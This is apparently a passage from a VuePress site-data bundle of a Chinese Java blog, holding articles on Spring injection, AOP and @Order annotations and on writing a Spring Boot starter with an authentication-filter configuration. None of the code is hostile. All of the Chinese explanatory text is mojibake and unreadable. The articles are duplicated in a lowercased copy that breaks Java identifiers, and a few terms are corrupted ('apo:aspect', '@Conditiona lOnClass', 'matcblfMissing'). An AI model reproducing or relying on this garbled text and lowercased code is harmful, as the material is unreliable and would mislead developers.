æ­¤ï¼å¦æå¨å®¹å¨ä¸­å£°æäºå¤ä¸ªç¸åç±»åç beanï¼åä¼åºç°é®é¢ï¼å ä¸º @autowired ä¸ç¥éè¦ä½¿ç¨åªä¸ª bean æ¥æ³¨å¥ãå æ­¤ï¼ä½¿ç¨ @qualifier ä¸ @autowired ä¸èµ·ï¼éè¿æå® bean åç§°æ¥éæå®éè£éç bean\n\nref="ç±»å"\n\n\n1\n\n\n\n# @qualifier\n\n@qualifier é»è®¤æåç§°è£éï¼è¿ä¸ªæ³¨è§£æ¯å±äº spring çï¼ï¼value é»è®¤ @qualifier (value = "") ç©ºå¼ã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @resource\n\n@resourceï¼è¿ä¸ªæ³¨è§£å±äº j2ee çï¼ï¼é»è®¤æç§åç§°è¿è¡è£éï¼åç§°å¯ä»¥éè¿ name å±æ§è¿è¡æå®ï¼ å¦ææ²¡ææå® name å±æ§ï¼å½æ³¨è§£åå¨å­æ®µä¸æ¶ï¼é»è®¤åå­æ®µåè¿è¡æç§åç§°æ¥æ¾ï¼å¦ææ³¨è§£åå¨ setter æ¹æ³ä¸é»è®¤åå±æ§åè¿è¡è£éã å½æ¾ä¸å°ä¸åç§°å¹éç bean æ¶ææç§ç±»åè¿è¡è£éãä½æ¯éè¦æ³¨æçæ¯ï¼å¦æ name å±æ§ä¸æ¦æå®ï¼å°±åªä¼æç§åç§°è¿è¡è£éã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @value\n\nç»åºæ¬æ°æ®ç±»åèµå¼\n\nref="åºç¡æ°æ®ç±»å"\n\n\n1\n\n\n\n# spring aop\n\n\n# @aspect\n\nå£°æçé¢\n\napo:aspect\n\n\n1\n\n\n\n# @before\n\nåç½®éç¥\n\napo:before\n\n\n1\n\n\n\n# @afterreturning\n\nåç½®æ­£å¸¸éç¥\n\naop:after-returning\n\n\n1\n\n\n\n# @afterthrowing\n\nåç½®å¼å¸¸éç¥\n\naop:after-throwing\n\n\n1\n\n\n\n# @after\n\næç»éç¥\n\naop:after\n\n\n1\n\n\n\n# @around\n\nç¯ç»éç¥\n\naop:around\n\n\n1\n\n\n\n# å¶ä»æ³¨è§£\n\n\n# @order\n\næå¼å§ order æ³¨è§£ç¨äºåé¢çä¼åçº§æå®ï¼å¨ 4.0 ä¹åå¯¹å®çåè½è¿è¡äºå¢å¼ºï¼æ¯æéåçæ³¨å¥æ¶ï¼æå®éåä¸­ bean çé¡ºåºï¼å¹¶ä¸ç¹å«æåºäºï¼å®å¯¹äºåå®ä¾ç bean ä¹é´çé¡ºåºï¼æ²¡æä»»ä½å½±åã\n\næ³¨è§£ @order æèæ¥å£ ordered çä½ç¨æ¯å®ä¹ spring ioc å®¹å¨ä¸­ bean çæ§è¡é¡ºåºçä¼åçº§ï¼èä¸æ¯å®ä¹ bean çå è½½é¡ºåºï¼bean çå è½½é¡ºåºä¸å @order æ ordered æ¥å£çå½±åï¼\n\n@order æ³¨è§£ä¸è½æå® bean çå è½½é¡ºåºï¼å®éç¨äº aop çä¼åçº§ï¼ä»¥åå°å¤ä¸ª bean æ³¨å¥å°éåæ¶ï¼è¿äº bean å¨éåä¸­çé¡ºåº\n\n# éè¯¯ä½¿ç¨\n\n// éè¯¯ä½¿ç¨æ¹æ³ 1\n@component\n@order(2)\npublic class ordera {\n    public ordera() {\n        system.out.println("************ a ************");\n    }\n}\n\n@component\n@order(1)\npublic class orderb {\n    public orderb() {\n        system.out.println("************ b ************");\n    }\n}\n// éè¯¯ä½¿ç¨æ¹æ³ 2\n@configuration\npublic class orderbeanconfig {\n \n    @order(2)\n    @bean\n    public orderc orderc() {\n        return new orderc();\n    }\n \n    @order(1)\n    @bean\n    public orderd orderd() {\n        return new orderd();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# æ­£ç¡®ä½¿ç¨\n\n@component\n@order(value = 3)\npublic class anobeana implements ibean{\n    public anobeana() {\n        system.out.println("************ anobean a ************");\n    }\n}\n\n@component\n@order(value = 2)\npublic class anobeanb implements ibean{\n \n    public anobeanb() {\n        system.out.println("************ anobean b ************");\n    }\n}\n\n@component\npublic class anobean {\n    public anobean(list<ibean> anobeanlist) {\n        for (ibean bean : anobeanlist) {\n            system.out.println("in ano testbean: "+ bean.getclass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @autoconfigureorder\n\n@autoconfigureorder æå®å¤é¨ä¾èµç autoconfig çå è½½é¡ºåºï¼å³å®ä¹å¨ / meta-inf/spring.factories æä»¶ä¸­çéç½® bean ä¼åçº§)ï¼å¨å½åå·¥ç¨ä¸­ä½¿ç¨è¿ä¸ªæ³¨è§£å¹¶æ²¡æä»ä¹ç¨ï¼åæ ·ç @autoconfigurebefore å @autoconfigureafter è¿ä¸¤ä¸ªæ³¨è§£çéç¨èå´å @autoconfigureorder ä¸æ ·',charsets:{cjk:!0}},{title:"SpringBoot ä¹ Starter",frontmatter:{title:"SpringBoot ä¹ Starter",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/201.SpringBoot%20%E4%B9%8B%20Starter.html",relativePath:"00.java/20.Spring/23.springboot/201.SpringBoot ä¹ Starter.md",key:"v-06ddce46",path:"/spring/spring-boot/201/",headers:[{level:2,title:"ä¸ãstarterä¾èµ",slug:"ä¸ãstarterä¾èµ",normalizedTitle:"ä¸ãstarter ä¾èµ",charIndex:311},{level:2,title:"äºãæ·»å éç½®ç±»",slug:"äºãæ·»å éç½®ç±»",normalizedTitle:"äºãæ·»å éç½®ç±»",charIndex:718},{level:2,title:"æ·»å å è½½ç±»",slug:"æ·»å å è½½ç±»",normalizedTitle:"æ·»å å è½½ç±»",charIndex:1894},{level:2,title:"åãæå®å è½½æä»¶è·¯å¾",slug:"åãæå®å è½½æä»¶è·¯å¾",normalizedTitle:"åãæå®å è½½æä»¶è·¯å¾",charIndex:5706},{level:2,title:"äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£",slug:"äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£",normalizedTitle:"äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£",charIndex:6516},{level:2,title:"å­ãåçº§å° SpringBoot3 ä½¿ç¨ starter",slug:"å­ãåçº§å°-springboot3-ä½¿ç¨-starter",normalizedTitle:"å­ãåçº§å° springboot3 ä½¿ç¨ starter",charIndex:7103}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä¸ãstarterä¾èµ äºãæ·»å éç½®ç±» æ·»å å è½½ç±» åãæå®å è½½æä»¶è·¯å¾ äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£ å­ãåçº§å° SpringBoot3 ä½¿ç¨ starter",content:'Spring Boot Starter æ¯ä¸ç»å¯éç¨çä¾èµåºï¼å®ä»¬æä¾äºä¸ç§å¿«éå¯å¨ Spring Boot åºç¨ç¨åºçæ¹å¼ãæ¯ä¸ª Starter é½åå«äºä¸ç»é¢éç½®çä¾èµé¡¹åèªå¨éç½®ç±»ï¼ä½¿å¾ä½¿ç¨èå¯ä»¥è½»æ¾å°éæåç§ä¸åçåè½æ¨¡åï¼èæ éæå¨éç½®å¤§éçä¾èµé¡¹ååæ°ãè¿æ ·ï¼å¼åäººåå¯ä»¥æ´å ä¸æ³¨äºä¸å¡é»è¾çå®ç°ï¼èä¸éè¦å³å¿åºå±çéç½®åéæç»èã\n\nSpring Boot Starter çæä¹å¨äºåå°äºåºç¨ç¨åºçå¼åææ¬åå¤æåº¦ï¼æé«äºå¼åæçåä»£ç è´¨éï¼å¹¶ä¸æ¯ææ´å¿«çè¿­ä»£åé¨ç½²ãå¦å¤ï¼ç¤¾åºä¹æä¾äºå¾å¤å¸¸ç¨ç Starterï¼å¦æ°æ®åºãWeb æ¡æ¶ãå®å¨æ¡æ¶ç­ï¼å¯ä»¥ç´æ¥ä½¿ç¨ï¼ä¹å¯ä»¥éè¿å®å¶æ¥æ»¡è¶³å·ä½çéæ±ã\n\n\n# ä¸ãstarter ä¾èµ\n\næ°å»ºä¸ä¸ª spring boot å·¥ç¨ã\n\n\x3c!-- åå«äºlog ä»¥å autoconfigure ç­ --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter</artifactId>\n</dependency>\n\n\x3c!-- å¯¹ @ConfigurationProperties çå¤ç --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# äºãæ·»å éç½®ç±»\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.Data;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.stereotype.Component;\n\nimport java.util.List;\n\n/**\n * @Author big uncle\n * @Date 2019/11/27 9:27\n **/\n@ConfigurationProperties(prefix = "security.authentication")\n@Data\npublic class AuthenticationProperties {\n\n    /**\n     * token\n    **/\n    private String userToken = "USER:TOKEN:";\n    /**\n     * æ¦æª\n    **/\n    private String authorization = "Authorization";\n    /**\n     * é»è®¤åæ°ç¨æ·\n     **/\n    private String userKey = "default:user:";\n    /**\n     * æé\n    **/\n    private String authorityKey = "USER:AUTHORITY:";\n    /**\n     * ç¨æ·è®¿é®èµæºé é»è®¤ä¸æ¦æª\n    **/\n    private Boolean authorityLock = false;\n    /**\n     * é¡¹ç®è¿æ»¤éå, ä»¥éå·åå²\n    **/\n    private List<String> projectUrl;\n    /**\n     * ç¹æ®è·¯å¾æ¾å¼æ¦æªï¼èµ°é RequestData æ¹å¼\n     **/\n    private List<String> specialUrl;\n    /**\n     * å¤±è´¥å¤çå¨\n    **/\n    private String failureUrl = "/failure/authenticationFilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# æ·»å å è½½ç±»\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @Author big uncle\n * @Date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.AuthenticationCep;\nimport com.xianwt.cloud.cep.AuthorizationCep;\nimport com.xianwt.cloud.cep.ProjectUrlFilterCep;\nimport com.xianwt.cloud.cep.SpecialFilterCep;\nimport com.xianwt.cloud.cep.impl.AuthenticationCepImpl;\nimport com.xianwt.cloud.cep.impl.AuthorizationCepImpl;\nimport com.xianwt.cloud.cep.impl.ProjectUrlFilterCepImpl;\nimport com.xianwt.cloud.cep.impl.SpecialFilterCepImpl;\nimport com.xianwt.cloud.filter.AuthenticationFilter;\nimport com.xianwt.cloud.server.AuthenticationServerSource;\nimport com.xianwt.cloud.server.AuthorizationServerSource;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.EnableAutoConfiguration;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnBean;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.annotation.Resource;\n\n@Configuration\n@EnableConfigurationProperties({AuthenticationProperties.class})\npublic class AuthenticationConfiguration {\n\n    private static final Log log = LogFactory.getLog(AuthenticationFilter.class);\n\n    @Autowired\n    private AuthenticationProperties authenticationProperties;\n\n\n    public ProjectUrlFilterCep projectUrlFilterCep(){\n        return new ProjectUrlFilterCepImpl(authenticationProperties);\n    }\n\n    public SpecialFilterCep specialFilterCep(){\n        return new SpecialFilterCepImpl(authenticationProperties);\n    }\n\n    @Bean\n    public AuthenticationCep authenticationCep(AuthenticationServerSource authenticationServerSource){\n        AuthenticationCepImpl authenticationCep = new AuthenticationCepImpl(authenticationProperties,authenticationServerSource);\n        return authenticationCep;\n    }\n\n    @Bean\n    public AuthorizationCep authorizationCep(AuthorizationServerSource authorizationServerSource){\n        AuthorizationCepImpl authenticationCep = new AuthorizationCepImpl(authenticationProperties,authorizationServerSource);\n        return authenticationCep;\n    }\n\n\n    @Bean\n    public FilterRegistrationBean<AuthenticationFilter> testFilterRegistration(AuthenticationCep authenticationCep,AuthorizationCep authorizationCep) {\n        FilterRegistrationBean<AuthenticationFilter> registration = new FilterRegistrationBean<>();\n        AuthenticationFilter authenticationFilter = AuthenticationFilter.builder()\n                .authenticationProperties(authenticationProperties)\n                .specialFilterCep(specialFilterCep())\n                .projectUrlFilterCep(projectUrlFilterCep())\n                .authenticationCep(authenticationCep)\n                .authorizationCep(authorizationCep)\n                .build();\n        registration.setFilter(authenticationFilter);\n        //éç½®è¿æ»¤è·¯å¾\n        registration.addUrlPatterns("/*");\n        //è®¾ç½®filteråç§°\n        registration.setName("authenticationFilter");\n        //è¯·æ±ä¸­è¿æ»¤å¨æ§è¡çååé¡ºåºï¼å¼è¶å°è¶åæ§è¡\n        registration.setOrder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\næä¸»è¦å¾å°±æ¯æ³¨è§£ï¼è³äºä¸å¡é»è¾å¤§å®¶é½æ¯åèªå·±å¾ã\n\n\n# åãæå®å è½½æä»¶è·¯å¾\n\nå¨ resources ç®å½ä¸æ°å»º META-INF æä»¶å¤¹ï¼å¨ META-INF æä»¶å¤¹ä¸å¨æ°å»º spring.factories æä»¶ï¼ä¸å¨ææ·»å ä»¥ä¸åå®¹\n\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=com.xianwt.cloud.properties.AuthenticationConfiguration\n\n\n1\n2\n\n\nä¸åºé®é¢å¤§å®¶åå¸åï¼å¨å«çé¡¹ç®ä¾èµèªå·±ç jar å°±å¯ä»¥äºãä½é¤äº EnableAutoConfiguration å¤è¿æå¶ä»çä¸äºç±»å¯ä»¥å±æä»¬ä½¿ç¨ï¼\n\n * EnableAutoConfigurationï¼æå®èªå¨éç½®ç±»ï¼å¯å¨ä¼æ§è¡æå®çç±»ã\n * ApplicationContextInitializerï¼åå§ååºç¨ç¨åºä¸ä¸æçåè°æ¥å£ï¼å¯ä»¥å¸®å©æä»¬æ¿å° applicationContextã\n * ApplicationListenerï¼çå¬åºç¨ç¨åºäºä»¶çåè°æ¥å£ï¼è¿éå¯ä»¥çå¬ ContextRefreshedEvent å½åºç¨ç¨åºä¸ä¸æè¢«åå§åæå·æ°æ¶è§¦åï¼ApplicationStartedEvent å½ Spring åºç¨ç¨åºä¸ä¸æåå¤å®æ¯åï¼ä½å°æªè¿è¡æ¶è§¦åï¼ApplicationReadyEvent å½åºç¨ç¨åºå·²ç»å¯å¨å¹¶åå¤å¥½æå¡è¯·æ±æ¶è§¦åï¼ContextClosedEvent å½åºç¨ç¨åºä¸ä¸æå³é­æ¶è§¦åï¼ä¹å¯ä»¥è§¦åæä»¬çèªå®ä¹äºä»¶ã\n * ConditionContributorï¼ä¸ºèªå¨éç½®æä¾é¢å¤çæ¡ä»¶ï¼å¯ä»¥ç¨ @ConditionalOnProperty æ¥ä»£æ¿ã\n * TemplateAvailabilityProviderï¼å¨è¿è¡æ¶æ£æ¥å¯ç¨æ¨¡æ¿çç­ç¥æ¥å£ï¼ä½¿ç¨å®ä»¬æ¥ç¡®å®æ¯å¦å­å¨æ­£ç¡®çæ¨¡æ¿æä»¶ã\n\n\n# äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£\n\n@ConditionalOnBean å¨å½åä¸ä¸æä¸­å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª Bean\n@ConditionalOnMissingBean å¨å½åä¸ä¸æä¸­ä¸å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª Bean\n@Conditiona lOnClass è¡¨ç¤ºå½ class path ææå®çç±»æ¶ï¼éç½®çæã\n@ConditionalOnMissingClass è¡¨ç¤ºå½ classpath ä¸­æ²¡ææå®çç±»çæ¶åï¼éç½®çæã\n@ConditionalOnProperty æ³¨è§£æ ¹æ® name æ¥è¯»å Spring Boot ç Environment ç åéåå«çå±æ§ï¼æ ¹æ®å¶å¼ä¸ havingValue çå¼æ¯è¾ç»æå³å®éç½®æ¯å¦çæãå¦ææ²¡ææå® havingValue ï¼åªè¦å±æ§ä¸ä¸º false ï¼éç½®é½è½çæãmatcblfMissing ä¸ºä¾ æå³çå¦æ Environment æ²¡æåå« âmessage.center.enabledâï¼éç½®ä¹è½çæï¼é»è®¤ä¸º falseã\n@ConditionalOnExpression ï¼å½è¡¨è¾¾å¼ä¸º true æ¶ï¼æä¼å®ä¾åä¸ä¸ª Bean ï¼æ¯æ SpEL è¡¨è¾¾å¼ï¼æ¯å¦æ ¹æ®éç½®æä»¶ä¸­çæä¸ªå¼æ¥å³å®éç½®æ¯å¦çæã\n@ConditionalOnJava ï¼å½å­å¨æå®ç Java çæ¬çæ¶åã\n\n\n# å­ãåçº§å° SpringBoot3 ä½¿ç¨ starter\n\nå¨ SpringBoot2.7 å°±å·²ç»è¯´æå»ºè®®ä½¿ç¨ META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports çæ¹å¼ä½ä¸ºå®ä¹èªå¨è£éæä»¶ä½ç½®ãèå¨ 3.0 çæ¬ï¼å·²ç»æ¯ç§»é¤äº META-INF/spring.factoriesï¼æä»¥æä»¬ç»§ç»­éè¿ META-INF/spring.factories æä»¶å®ä¹å°ä¸å¨çæã\n\n\x3c!-- æ·»å ä¾èµ --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-autoconfigure</artifactId>\n</dependency>\n\n\x3c!-- å¯¹ @ConfigurationProperties çå¤ç --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@AutoConfiguration\n@EnableConfigurationProperties(value = TestProperties.class)\npublic class TestAutoConfiguration {\n\n    @Bean\n    public TestTemplate testTemplate(){\n        return new TestTemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@AutoConfiguration æ¯ spring boot2.7 æ°å¼å¥çï¼èªå¨éç½®ç±»å¿é¡»æ¾è¿ä¸é¢çæä»¶éæç®èªå¨éç½®ç±»\n\nå¨ META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports æä»¶éé¢æ·»å \n\ncom.spring.demo.test.TestAutoConfiguration\n\n\n1\n',normalizedContent:'spring boot starter æ¯ä¸ç»å¯éç¨çä¾èµåºï¼å®ä»¬æä¾äºä¸ç§å¿«éå¯å¨ spring boot åºç¨ç¨åºçæ¹å¼ãæ¯ä¸ª starter é½åå«äºä¸ç»é¢éç½®çä¾èµé¡¹åèªå¨éç½®ç±»ï¼ä½¿å¾ä½¿ç¨èå¯ä»¥è½»æ¾å°éæåç§ä¸åçåè½æ¨¡åï¼èæ éæå¨éç½®å¤§éçä¾èµé¡¹ååæ°ãè¿æ ·ï¼å¼åäººåå¯ä»¥æ´å ä¸æ³¨äºä¸å¡é»è¾çå®ç°ï¼èä¸éè¦å³å¿åºå±çéç½®åéæç»èã\n\nspring boot starter çæä¹å¨äºåå°äºåºç¨ç¨åºçå¼åææ¬åå¤æåº¦ï¼æé«äºå¼åæçåä»£ç è´¨éï¼å¹¶ä¸æ¯ææ´å¿«çè¿­ä»£åé¨ç½²ãå¦å¤ï¼ç¤¾åºä¹æä¾äºå¾å¤å¸¸ç¨ç starterï¼å¦æ°æ®åºãweb æ¡æ¶ãå®å¨æ¡æ¶ç­ï¼å¯ä»¥ç´æ¥ä½¿ç¨ï¼ä¹å¯ä»¥éè¿å®å¶æ¥æ»¡è¶³å·ä½çéæ±ã\n\n\n# ä¸ãstarter ä¾èµ\n\næ°å»ºä¸ä¸ª spring boot å·¥ç¨ã\n\n\x3c!-- åå«äºlog ä»¥å autoconfigure ç­ --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter</artifactid>\n</dependency>\n\n\x3c!-- å¯¹ @configurationproperties çå¤ç --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# äºãæ·»å éç½®ç±»\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.data;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.stereotype.component;\n\nimport java.util.list;\n\n/**\n * @author big uncle\n * @date 2019/11/27 9:27\n **/\n@configurationproperties(prefix = "security.authentication")\n@data\npublic class authenticationproperties {\n\n    /**\n     * token\n    **/\n    private string usertoken = "user:token:";\n    /**\n     * æ¦æª\n    **/\n    private string authorization = "authorization";\n    /**\n     * é»è®¤åæ°ç¨æ·\n     **/\n    private string userkey = "default:user:";\n    /**\n     * æé\n    **/\n    private string authoritykey = "user:authority:";\n    /**\n     * ç¨æ·è®¿é®èµæºé é»è®¤ä¸æ¦æª\n    **/\n    private boolean authoritylock = false;\n    /**\n     * é¡¹ç®è¿æ»¤éå, ä»¥éå·åå²\n    **/\n    private list<string> projecturl;\n    /**\n     * ç¹æ®è·¯å¾æ¾å¼æ¦æªï¼èµ°é requestdata æ¹å¼\n     **/\n    private list<string> specialurl;\n    /**\n     * å¤±è´¥å¤çå¨\n    **/\n    private string failureurl = "/failure/authenticationfilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# æ·»å å è½½ç±»\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @author big uncle\n * @date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.authenticationcep;\nimport com.xianwt.cloud.cep.authorizationcep;\nimport com.xianwt.cloud.cep.projecturlfiltercep;\nimport com.xianwt.cloud.cep.specialfiltercep;\nimport com.xianwt.cloud.cep.impl.authenticationcepimpl;\nimport com.xianwt.cloud.cep.impl.authorizationcepimpl;\nimport com.xianwt.cloud.cep.impl.projecturlfiltercepimpl;\nimport com.xianwt.cloud.cep.impl.specialfiltercepimpl;\nimport com.xianwt.cloud.filter.authenticationfilter;\nimport com.xianwt.cloud.server.authenticationserversource;\nimport com.xianwt.cloud.server.authorizationserversource;\nimport lombok.extern.slf4j.slf4j;\nimport org.apache.commons.logging.log;\nimport org.apache.commons.logging.logfactory;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.enableautoconfiguration;\nimport org.springframework.boot.autoconfigure.condition.conditionalonbean;\nimport org.springframework.boot.autoconfigure.condition.conditionalonclass;\nimport org.springframework.boot.autoconfigure.condition.conditionalonproperty;\nimport org.springframework.boot.context.properties.enableconfigurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.annotation.resource;\n\n@configuration\n@enableconfigurationproperties({authenticationproperties.class})\npublic class authenticationconfiguration {\n\n    private static final log log = logfactory.getlog(authenticationfilter.class);\n\n    @autowired\n    private authenticationproperties authenticationproperties;\n\n\n    public projecturlfiltercep projecturlfiltercep(){\n        return new projecturlfiltercepimpl(authenticationproperties);\n    }\n\n    public specialfiltercep specialfiltercep(){\n        return new specialfiltercepimpl(authenticationproperties);\n    }\n\n    @bean\n    public authenticationcep authenticationcep(authenticationserversource authenticationserversource){\n        authenticationcepimpl authenticationcep = new authenticationcepimpl(authenticationproperties,authenticationserversource);\n        return authenticationcep;\n    }\n\n    @bean\n    public authorizationcep authorizationcep(authorizationserversource authorizationserversource){\n        authorizationcepimpl authenticationcep = new authorizationcepimpl(authenticationproperties,authorizationserversource);\n        return authenticationcep;\n    }\n\n\n    @bean\n    public filterregistrationbean<authenticationfilter> testfilterregistration(authenticationcep authenticationcep,authorizationcep authorizationcep) {\n        filterregistrationbean<authenticationfilter> registration = new filterregistrationbean<>();\n        authenticationfilter authenticationfilter = authenticationfilter.builder()\n                .authenticationproperties(authenticationproperties)\n                .specialfiltercep(specialfiltercep())\n                .projecturlfiltercep(projecturlfiltercep())\n                .authenticationcep(authenticationcep)\n                .authorizationcep(authorizationcep)\n                .build();\n        registration.setfilter(authenticationfilter);\n        //éç½®è¿æ»¤è·¯å¾\n        registration.addurlpatterns("/*");\n        //è®¾ç½®filteråç§°\n        registration.setname("authenticationfilter");\n        //è¯·æ±ä¸­è¿æ»¤å¨æ§è¡çååé¡ºåºï¼å¼è¶å°è¶åæ§è¡\n        registration.setorder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\næä¸»è¦å¾å°±æ¯æ³¨è§£ï¼è³äºä¸å¡é»è¾å¤§å®¶é½æ¯åèªå·±å¾ã\n\n\n# åãæå®å è½½æä»¶è·¯å¾\n\nå¨ resources ç®å½ä¸æ°å»º meta-inf æä»¶å¤¹ï¼å¨ meta-inf æä»¶å¤¹ä¸å¨æ°å»º spring.factories æä»¶ï¼ä¸å¨ææ·»å ä»¥ä¸åå®¹\n\n# auto configure\norg.springframework.boot.autoconfigure.enableautoconfiguration=com.xianwt.cloud.properties.authenticationconfiguration\n\n\n1\n2\n\n\nä¸åºé®é¢å¤§å®¶åå¸åï¼å¨å«çé¡¹ç®ä¾èµèªå·±ç jar å°±å¯ä»¥äºãä½é¤äº enableautoconfiguration å¤è¿æå¶ä»çä¸äºç±»å¯ä»¥å±æä»¬ä½¿ç¨ï¼\n\n * enableautoconfigurationï¼æå®èªå¨éç½®ç±»ï¼å¯å¨ä¼æ§è¡æå®çç±»ã\n * applicationcontextinitializerï¼åå§ååºç¨ç¨åºä¸ä¸æçåè°æ¥å£ï¼å¯ä»¥å¸®å©æä»¬æ¿å° applicationcontextã\n * applicationlistenerï¼çå¬åºç¨ç¨åºäºä»¶çåè°æ¥å£ï¼è¿éå¯ä»¥çå¬ contextrefreshedevent å½åºç¨ç¨åºä¸ä¸æè¢«åå§åæå·æ°æ¶è§¦åï¼applicationstartedevent å½ spring åºç¨ç¨åºä¸ä¸æåå¤å®æ¯åï¼ä½å°æªè¿è¡æ¶è§¦åï¼applicationreadyevent å½åºç¨ç¨åºå·²ç»å¯å¨å¹¶åå¤å¥½æå¡è¯·æ±æ¶è§¦åï¼contextclosedevent å½åºç¨ç¨åºä¸ä¸æå³é­æ¶è§¦åï¼ä¹å¯ä»¥è§¦åæä»¬çèªå®ä¹äºä»¶ã\n * conditioncontributorï¼ä¸ºèªå¨éç½®æä¾é¢å¤çæ¡ä»¶ï¼å¯ä»¥ç¨ @conditionalonproperty æ¥ä»£æ¿ã\n * templateavailabilityproviderï¼å¨è¿è¡æ¶æ£æ¥å¯ç¨æ¨¡æ¿çç­ç¥æ¥å£ï¼ä½¿ç¨å®ä»¬æ¥ç¡®å®æ¯å¦å­å¨æ­£ç¡®çæ¨¡æ¿æä»¶ã\n\n\n# äºãä»ç»ä¸å¶ä»æ¡ä»¶è£éæ³¨è§£\n\n@conditionalonbean å¨å½åä¸ä¸æä¸­å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª bean\n@conditionalonmissingbean å¨å½åä¸ä¸æä¸­ä¸å­å¨æä¸ªå¯¹è±¡æ¶ï¼æä¼å®ä¾åä¸ä¸ª bean\n@conditiona lonclass è¡¨ç¤ºå½ class path ææå®çç±»æ¶ï¼éç½®çæã\n@conditionalonmissingclass è¡¨ç¤ºå½ classpath ä¸­æ²¡ææå®çç±»çæ¶åï¼éç½®çæã\n@conditionalonproperty 